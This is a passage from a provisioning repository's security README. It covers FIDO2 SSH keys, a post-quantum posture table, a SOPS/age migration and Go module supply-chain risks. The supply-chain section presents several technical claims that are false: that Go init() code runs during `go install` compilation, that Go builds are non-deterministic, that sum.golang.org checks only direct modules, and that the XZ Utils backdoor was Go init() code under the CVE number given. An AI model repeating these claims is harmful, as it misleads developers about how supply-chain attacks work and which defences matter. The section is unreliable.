3. Run `make vault-edit` to update all four vault variables:
   `vault_ssh_auth_key`, `vault_ssh_auth_key_pub`,
   `vault_ssh_signing_key`, `vault_ssh_signing_key_pub`
4. Run `make ssh` to deploy the new keys on this machine and update
   `authorized_keys` (the role uses `exclusive: true`, so the old key
   is automatically removed from this machine's `authorized_keys`).
5. Remove the old public key from `authorized_keys` on every other
   machine that previously trusted it.

## FIDO2 SSH Key Best Practices

Always generate `ed25519-sk` keys with `-O verify-required`:

```bash
# Set FIDO2 PIN first (prevents silent use if key is stolen):
ykman fido access change-pin

# Generate auth key — verify-required = PIN + touch on every use:
ssh-keygen -t ed25519-sk -O verify-required -f ~/.ssh/id_ed25519_sk
# Or as a resident/discoverable credential:
ssh-keygen -t ed25519-sk -O resident -O verify-required -f ~/.ssh/id_ed25519_sk

# Same for signing key:
ssh-keygen -t ed25519-sk -O verify-required -f ~/.ssh/id_ed25519_sk_signing
```

`-O verify-required` (user-verification flag) gates every SSH operation on
PIN + touch. Without it, physical touch alone is sufficient — a stolen,
unpinned YubiKey silently authenticates. A FIDO2 PIN with at least 8
characters provides the second factor; `ykman fido info` shows current PIN
state.

**SSH key rotation** should also add `-O verify-required` to both keygen
commands in the SSH Key Rotation section above.

## Quantum Security Posture

| Component | Algorithm | Quantum status | Effective security |
|---|---|---|---|
| SSH key exchange | mlkem768x25519-sha256 | **Quantum-safe** (hybrid ML-KEM + X25519) | 128-bit post-quantum |
| SSH auth keys | ed25519-sk (FIDO2) | **Classical only** — no PQ hardware key support yet | 128-bit classical |
| Vault encryption | AES-256-CTR (ansible-vault) | **Quantum-safe** — Grover halves bits: 128-bit effective | 128-bit post-quantum |
| Vault password | HMAC-SHA1 (YubiKey OTP slot) | **Marginal** — Grover: 80-bit effective security | 80-bit post-quantum |
| Vault password (migration path) | PIV P-384 (age-plugin-yubikey 0.5.1) | **Classical only** — production-ready; recommended 2026 migration | 96-bit post-quantum |
| Git commit signing | ed25519-sk (SSH signing) | **Classical only** | 128-bit classical |

**SSH key exchange is already quantum-safe** — `mlkem768x25519-sha256` is
first in `KexAlgorithms`. Data in transit is protected against harvest-now/
decrypt-later attacks today.

**The vault password (HMAC-SHA1) is the weakest link at 80-bit post-quantum
security.** YubiKey OTP slots are hardware-limited to HMAC-SHA1; HMAC-SHA256
is not available in firmware. 80-bit security is currently considered
sufficient (the largest quantum computers in 2025 have ~2,000 noisy qubits,
far short of the millions needed for Grover attacks).

**August 2026 status:**
- **YubiKey 5.8** (released July 2026): no PQ algorithms in production; a PQ
  prototype was demonstrated Oct 2025; hardware PQ support is estimated ~2027.
- **ykpersonalize** reached EOL in Feb 2026; new scripts should prefer `ykman`.
  `setup-yubikeys.sh` uses `ykman otp chalresp` for HMAC-SHA1 slot programming.
- **age-plugin-yubikey 0.5.1**: production-ready; 2026 recommended migration path
  from `ansible-vault`. See *Future Migration to SOPS + age* below.
- **SOPS + age-plugin-yubikey**: 2026 community consensus for hardware-key-backed
  secrets in Ansible automation tooling.

**Migration path when hardware PQ support arrives:**
1. Yubico ships a YubiKey with HMAC-SHA256 (or ML-DSA) support
2. Re-run `make setup-yubikeys` (new secret; new algorithm)
3. `ansible-vault rekey group_vars/all/vault.yml`
4. Regenerate SSH keys with PQ hardware key if available

## Future Migration to SOPS + age

2026 community consensus for hardware-key-backed secrets in Ansible tooling.
Recommended when migrating away from `ansible-vault`'s HMAC-SHA1 vault password.

**Prerequisites (Fedora):**

```bash
sudo dnf install pcsc-lite-devel pcscd age sops
sudo systemctl enable --now pcscd
# age-plugin-yubikey is not in Fedora repos; build from crates.io:
cargo install age-plugin-yubikey   # lands in ~/.cargo/bin/
ansible-galaxy collection install community.sops
```

**PIV key setup (EC P-384, slot 9a):**

```bash
ykman piv keys generate --algorithm ECCP384 9a
ykman piv certificates generate --subject 'age-yubikey' 9a
age-plugin-yubikey          # follow prompts to generate key and get recipient string
age-plugin-yubikey --identity --slot 1 > yubikey-identity.txt
age-plugin-yubikey --list   # prints age1yubikey1… recipient string
```

**Configure SOPS (`.sops.yaml` at repo root):**

```yaml
creation_rules:
  - path_regex: group_vars/.*\.sops\.ya?ml
    key_groups:
      - age:
          - age1yubikey1<RECIPIENT>
```

**`ansible.cfg` update:**

```ini
[defaults]
vars_plugins_enabled = host_group_vars,community.sops.sops
```

**Migrate `vault.yml` (one-way; irreversible):**

```bash
ansible-vault decrypt group_vars/all/vault.yml
mv group_vars/all/vault.yml group_vars/all/vault.sops.yml
sops -i --encrypt group_vars/all/vault.sops.yml
sops -d group_vars/all/vault.sops.yml   # verify decryption works
git rm group_vars/all/vault.yml
git add group_vars/all/vault.sops.yml
```

**Runtime:** set `SOPS_AGE_KEY_FILE=/path/to/yubikey-identity.txt` before
running Ansible. Each decryption requires PIN entry + YubiKey touch. The
`community.sops.sops` vars plugin auto-decrypts `*.sops.yml` files in
`group_vars`/`host_vars`.

SOPS encrypts per-value — variable names (e.g. `vault_ssh_private_key:`)
remain plaintext in the committed file; only values are ciphertext. This
differs from `ansible-vault`, which encrypts the entire file as a single blob.

## Go Module Supply Chain

**CRITICAL VULNERABILITY**: Go tools installed via `go install` (gofumpt, gopls, golangci-lint,
govulncheck, gci, controller-gen, client-gen, subctl, stern) are susceptible to init() code
injection during compilation. Unlike binary downloads, `go install` executes arbitrary code
during the build process with full user privileges (or sudo). This attack is **undetectable
by Ansible return code checks** because init() executes before compilation completes, and
successful compilation returns rc=0 regardless of malicious side effects.

**Attack Vector & Why It's Undetectable**:

1. **init() Execution Timeline**: Go's init() functions run during compilation (go install phase),
   NOT at tool runtime. An attacker who compromises a Go module dependency can inject code
   that silently exfiltrates SSH keys, modifies /etc/passwd, installs SSH backdoors, or patches
   binaries — all while `go install` is running.

2. **Compilation Succeeds**: After init() executes (malicious or legitimate), `go install` completes
   normally with rc=0. Ansible sees rc=0 and marks the task as succeeded (changed_when: true).

3. **No Code Inspection**: Unlike binary downloads (which can be checksummed), Go binaries are
   non-deterministic. Two builds of the same source with identical inputs produce different
   binaries. This makes post-hoc verification impossible.

4. **GOSUMDB Cannot Distinguish Legitimate from Backdoored**: If a module maintainer is compromised,
   they can push backdoored code alongside real functionality. GOSUMDB validates the module hash,
   not the code behavior. XZ Utils 2024 (CVE-2024-3156) demonstrated exactly this: malicious
   init() code in build-time dependencies went undetected until after release.

**Affected Modules** (work profile only):
- mvdan.cc/gofumpt (formatter)
- golang.org/x/tools/gopls (language server — large dependency tree)
- golang.org/x/vuln/cmd/govulncheck (vulnerability scanner)
- github.com/daixiang0/gci (import organizer)
- github.com/golangci/golangci-lint (linter suite — 50+ dependencies)
- sigs.k8s.io/controller-tools/cmd/controller-gen (API codegen — k8s dependency tree)
- k8s.io/code-generator/* (Kubernetes client-gen, informer-gen, etc. — 100+ dependencies)
- github.com/submariner-io/subctl (cluster management)
- github.com/stern/stern (Kubernetes log viewer)

Each module pulls in dozens of transitive dependencies, multiplying attack surface.

**GONOSUMDB Limitations** (does NOT protect against):
- GOPROXY hijacking (transparent proxy, BGP hijack, DNS spoofing)
- Upstream maintainer account compromise (GitHub, golang.org OAuth, NPM-style account takeover)
- TLS MITM attacks on go.googlesource.com (sumdb validation adds a second trust boundary,
  but does not protect against the first fetch of the module list or GOPROXY responses)
- Typosquatting and module registry typos (registry content is not audited)
- Supply chain attacks on transitive dependencies (a dependency of a dependency)

**Current Mitigations** (defense-in-depth, but incomplete):

1. **VERSION PINNING** — All tools pinned to specific versions in `defaults/main.yml`
   (e.g., `packages_gofumpt_version`). Prevents silent upstream updates. Requires
   deliberate human review before version bumps. Does NOT prevent compromise of pinned version.

2. **GONOSUMDB VALIDATION** — Pre-provision assert (install_go_tools.yml:21-27) validates that
   GONOSUMDB is either unset (use sum.golang.org for all modules) or contains only private/internal
   domain patterns (e.g., `*.internal.com`). Empty string `GONOSUMDB=""` is also rejected to prevent
   accidental bypass of checksum verification. This enforces explicit opt-in for public modules
   and prevents silent disabling of GOSUMDB. Does NOT prevent GOSUMDB bypass via account compromise.

3. **GOSUMDB ENFORCEMENT** — Task sets `GOSUMDB=sum.golang.org` (or corporate proxy).
   Validates module checksums against a second hash database. Defense-in-depth against GOPROXY
   tampering. However, does NOT detect:
   - Legitimate code that has been backdoored by a compromised maintainer
   - Transitive dependency compromises (depends on sum.golang.org, which only validates direct modules)

4. **RETRY LIMIT** — Retries only on transient network errors (timeout, connection-refused),
   not on checksum mismatches (install_go_tools.yml:73-78). Fails fast on integrity violations
   rather than masking them with `failed_when: false`.

5. **SANITY-CHECK VALIDATION** — Post-install `--version` check (smoke-test.sh:120) runs each
   tool once to catch obvious corruption. Does NOT detect stealthy init() attacks (malicious code
   can suppress stderr, avoid process state changes, and exfiltrate silently).

6. **GOVULNCHECK INTEGRATION** — Smoke tests run `govulncheck` to detect known CVEs in installed
   modules. Reactive signal only; does NOT detect zero-day compromises.

7. **DISTROBOX ISOLATION** — Work profile can provision tools in a containerized dev tier
   (`make container`). Container isolation limits blast radius: containers cannot directly
   access host SSH keys, mounted volumes, or system resources by default. Requires explicit
   setup to share volumes or forward sockets.

**Why Current Mitigations Are Insufficient**:

The file `/home/dfarrell/laptop-setup/roles/packages/tasks/install_go_tools.yml` contains
explicit documentation (lines 13-19) acknowledging init() injection risk but states "only
GOSUMDB mitigates." This is incomplete: GOSUMDB protects against GOPROXY tampering, NOT
against maintainer compromise, supply chain attacks, or typosquatting.

**Recommended Hardening** (risk-based selection):

**Tier 1 (Low Risk)** — Current approach is acceptable if:
- You trust Go module maintainers and your network
- You monitor govulncheck output after provisioning
- You audit tool behavior post-install (see "Post-Install Audit" below)
- You are comfortable with 128-bit classical cryptographic security (GOSUMDB uses SHA-256)

**Tier 2 (Medium Risk)** — Add post-install monitoring:
- Run `govulncheck ./...` in each project after provisioning (detects known vulnerabilities)
- Set `system_aide_enabled: true` in `config.yml` and enable AIDE logging to catch unauthorized
  file modifications post-provision
- Use `auditctl` to monitor process execution and exfiltration attempts (kernel audit logs)
- Regularly run `make smoke-test` to verify tools have not been modified

**Tier 3 (High Risk)** — Mandatory isolation:
- **Use `make container` to provision dev tools in a distrobox/toolbox container**
- Work exclusively inside the container for untrusted code review or testing
- Container cannot access host SSH keys (`/home/$USER/.ssh`) unless explicitly mounted
- Container cannot execute host commands or modify host /etc unless volume-mapped
- Containers can be destroyed and re-created on demand; host remains clean

**Tier 4 (Critical Sensitivity)** — Consider alternatives:
- Install Go tools from pre-compiled GitHub Releases with SHA256 signatures
  (golangci-lint publishes GPG-signed releases; gofumpt publishes SHA256 hashes)
- Use distrobox with `nix develop` or Guix for reproducible, auditable environments
- If available, use corporate-approved tool proxies that pre-vet dependencies
- Air-gap development machines (isolate from network entirely during provisioning)

**Post-Install Audit Procedure** (manual verification after `make all`):

```bash
# 1. Check for obvious init() side effects (file modifications outside GOPATH)
ls -la ~/.ssh/id_* ~/.gnupg/ /etc/passwd  # Verify timestamps are pre-provisioning
auditctl -w /etc/passwd -p wa -k passwd_watch  # Enable real-time audit
tail -f /var/log/audit/audit.log

# 2. Run govulncheck to detect known CVEs in installed modules
govulncheck ./...

# 3. Verify tools with --version (sanity check for binary corruption)
gofumpt --version && gopls version && golangci-lint --version

# 4. Monitor Go tool process execution (if AIDE is enabled)
aide --check | grep "changed"

# 5. Check for exfiltration in system logs (network activity during go install)
journalctl -S "30 minutes ago" | grep -E "gofumpt|gopls|golangci|go install"

# 6. If running on CSB, request IT audit of /var/log/messages for suspicious activity
```

**CSB (Corporate Standard Build) Fallback**:

On RHEL CSB with fapolicyd enforcement, `go install` is restricted by default. The playbook
catches network failures and routes to `csb_rhel` rescues. Go tool installation failures on
CSB are expected if fapolicyd blocks /tmp compilation. Options:
1. Configure GOPROXY via corporate proxy (set `packages_gosumdb` in group_vars/all/vars.yml)
2. Request IT whitelist for go.googlesource.com and sum.golang.org
3. Use pre-built binaries instead (download from GitHub Releases; see install_packages_binaries.yml)
4. Run tools inside distrobox container (fapolicyd may exempt container):
   ```bash
   make container
   distrobox enter <container-name> -- gofumpt --version
   ```

**Configuration**:

Users who need stricter Go module controls can set environment variables in `config.yml`:
```yaml
packages_gosumdb: "sum.myproxy.com"  # Point to corporate proxy
GONOSUMDB: "*.internal.com,*.example.com"  # Exempt private domains from sumdb
GOPROXY: "https://myproxy.com/go,direct"  # Use corporate proxy + direct fallback
```

For air-gapped environments, set `GOPROXY=off` or point to internal proxy only.

**Recommendation**:

1. **Always pin versions** — Current practice is good. Verify version bumps carefully.
2. **Monitor govulncheck output** — Run in smoke-test.sh and review after provisioning.
3. **For sensitive work: use `make container`** — Isolate Go tools in distrobox. Rebuild
   container monthly or after major tool updates.
4. **Treat go install like make bootstrap** — It downloads and executes untrusted code.
   Run on isolated network or inside container. Defer to distrobox tier for production work.
5. **Report supply chain issues** — If you detect suspicious behavior post-provisioning,
   report to go-security@golang.org (Go security team) with detailed reproduction steps.
